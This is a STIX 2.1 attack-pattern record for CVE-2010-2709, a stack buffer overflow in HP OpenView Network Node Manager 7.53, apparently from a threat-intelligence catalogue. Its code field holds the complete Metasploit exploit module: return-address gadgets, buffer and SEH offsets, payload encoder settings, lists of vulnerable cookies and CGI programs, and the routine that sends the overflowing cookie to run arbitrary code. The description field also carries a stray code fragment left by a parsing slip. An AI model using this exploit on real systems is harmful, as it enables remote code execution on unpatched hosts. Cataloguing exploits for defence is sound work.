{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70a8daa9-3119-4100-9c22-f180c0f54274",
    "created": "2024-08-14T16:52:52.78024Z",
    "modified": "2024-08-14T16:52:52.780244Z",
    "name": "\"HP NNM CGI webappmon.exe OvJavaLocale Buffer Overflow\"",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53. By sending a request containing a cookie longer than 5120 bytes, an attacker can overflow a stack buffer and execute arbitrary code.  The vulnerable code is within the OvWwwDebug function. The static-sized stack buffer is declared within this function. When the vulnerability is triggered, the stack trace looks like the following:  #0 ... #1 sprintf_new(local_stack_buf, fmt, cookie); #2 OvWwwDebug(\"   HTTP_COOKIE=%s\\n\", cookie); #3 ?OvWwwInit@@YAXAAHQAPADPBD@Z(x, x, x); #4 sub_405ee0(\"nnm\", \"webappmon\");  No validation is done on the cookie argument. There are no stack cookies, so exploitation is easily achieved by overwriting the saved return address or SEH frame.  The original advisory detailed an attack vector using the \"OvJavaLocale\" cookie being passed in a request to \"webappmon.exe\". Further research shows that several different cookie values, as well as several different CGI applications, can be used. ' 'License'\t  => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_webappmon_ovjavalocale.rb",
            "external_id": "hp_nnm_webappmon_ovjavalocale.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2709"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02446520"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/hp-nnm-ovjavalocale-buffer-overflow"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/OpenView.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => \"HP NNM CGI webappmon.exe OvJavaLocale Buffer Overflow\",\n      'Description' => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53.\n        By sending a request containing a cookie longer than 5120 bytes, an attacker can overflow\n        a stack buffer and execute arbitrary code.\n\n        The vulnerable code is within the OvWwwDebug function. The static-sized stack buffer is\n        declared within this function. When the vulnerability is triggered, the stack trace looks\n        like the following:\n\n          #0 ...\n          #1 sprintf_new(local_stack_buf, fmt, cookie);\n          #2 OvWwwDebug(\"   HTTP_COOKIE=%s\\n\", cookie);\n          #3 ?OvWwwInit@@YAXAAHQAPADPBD@Z(x, x, x);\n          #4 sub_405ee0(\"nnm\", \"webappmon\");\n\n        No validation is done on the cookie argument. There are no stack cookies, so exploitation\n        is easily achieved by overwriting the saved return address or SEH frame.\n\n        The original advisory detailed an attack vector using the \"OvJavaLocale\" cookie being\n        passed in a request to \"webappmon.exe\". Further research shows that several different\n        cookie values, as well as several different CGI applications, can be used.\n      '},\n      'License'\t  => MSF_LICENSE,\n      'Author'      =>\n        [\n          'Nahuel Riva',\n          'sinn3r',\n          'jduck'\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2010-2709' ],\n          [ 'OSVDB', '66932' ],\n          [ 'BID', '42154' ],\n          [ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02446520' ],\n          [ 'URL', 'http://www.coresecurity.com/content/hp-nnm-ovjavalocale-buffer-overflow' ]\n        ],\n      'Payload'\t =>\n        {\n          'Space'    => 1024, # 5120 buffer?\n          'BadChars' => (0..0x1f).to_a.pack('C*'),\n          'DisableNops'    => true,\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister'  => 'ESP'\n            },\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"seh\",\n          \"InitialAutoRunScript\" => \"post/windows/manage/priv_migrate\",\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'HP OpenView Network Node Manager 7.53',\n            {\n              'Ret' => 0x5a212a4a # jmp esp in ov.dll (2004-10-05, 294,967 bytes)\n            }\n          ],\n          [ 'HP OpenView Network Node Manager 7.53 (Windows 2003)',\n            {\n              'Ret' => 0x71c02b67 # push esp / ret in ws2_32.dll v5.2.3790.3959\n            }\n          ],\n          [ 'Debug Target',\n            {\n              #'Ret' => 0x5a30575b # int3 in ovwww.dll (2007-09-18, 106,558 bytes)\n              'Ret' => 0x71c0782c # int3 in ws2_32.dll v5.2.3790.3959\n            }\n          ]\n        ],\n      'Privileged'\t=> false,\n      'DisclosureDate' => '2010-08-03'))\n\n      register_options(\n        [\n          OptString.new('COOKIE', [ false, \"The Cookie name to use\", nil ]),\n          OptString.new('CGI', [ false, \"The CGI to use\", nil ])\n        ])\n  end\n\n  def exploit\n\n    print_status(\"Trying target #{target.name}...\")\n\n    cookies = %w{\n      OvJavaScript OvTitleFrame OvHelpWindow OvMap OvSession OvJavaLocale\n      OvOSLocale OvLogin OvDebug OvDeveloper OvTreeControl OvJavaScript OvProduct\n      OvPort OvLocale OvWebSession\n    }\n    # This triggers a heap overflow - OvAcceptLang  ;-)\n    cookie = datastore['COOKIE'].dup if datastore['COOKIE']\n    cookie ||= cookies[rand(cookies.length)]\n\n    cgis = %w{\n      Main/Snmp.exe getcvdata.exe getnnmdata.exe jovw.exe jovwreg.exe\n      nnmRptConfig.exe nnmRptPresenter.exe OpenView5.exe OpenView.exe ovalarm.exe\n      ovlaunch.exe ovlaunchreg.exe ovlogin.exe ovsessioninfo.exe ovsipexport.exe\n      OvHelp.exe OvWebHelp.exe printsession.exe snmpviewer.exe Title.exe\n      Toolbar.exe webappmon.exe\n    }\n    # These don't work: jovgraph.exe\n    cgi = datastore['CGI'].dup if datastore['CGI']\n    cgi ||= cgis[rand(cgis.length)]\n    if cgi[0,7] != '/OvCgi/'\n      cgi = '/OvCgi/' + cgi\n    end\n\n    print_status(\"Using cookie: #{cookie} and cgi: #{cgi}\")\n\n    cookie << \"=\"\n\n    # sprintf_new(buf, \"   HTTP_COOKIE=%s\", bigstr);\n    start = '   HTTP_COOKIE='\n    start << cookie\n\n    # Offsets from the start of the buffer:\n    # ebp @ 5120\n    # ret @ 5124\n    # seh @ 7044\n\n    buf = rand_text_alphanumeric(5124 - start.length)\n    buf << [target.ret].pack('V')\n    #buf << \"\\xcc\"\n    buf << payload.encoded\n\n    cookie << buf\n    cookie << \";\"\n\n    res = send_request_cgi({\n      'uri'\t\t  => cgi,\n      'method'\t  => \"GET\",\n      'headers'  =>\n        {\n          'Cookie' => cookie\n        }\n    }, 3)\n\n    if res and res.code != 502\n      print_error(\"Eek! We weren't expecting a response, but we got one\")\n    end\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-03",
    "x_mitre_platforms": [
        "win'"
    ]
}